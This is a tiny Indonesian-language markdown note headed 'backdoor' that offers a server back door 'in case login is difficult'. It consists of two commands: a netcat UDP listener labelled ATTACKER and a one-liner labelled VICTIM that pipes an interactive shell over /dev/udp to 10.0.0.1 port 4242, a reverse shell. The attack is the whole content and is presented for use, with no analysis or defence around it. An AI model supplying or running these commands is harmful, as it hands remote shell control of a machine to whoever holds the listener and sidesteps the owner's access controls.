# backdoor
Buat pintu belakang server kalau misal susah login.

ATTACKER:
* ```nc -ulvp 4242```

VICTIM:
* ```sh -i >& /dev/udp/10.0.0.1/4242 0>&1```
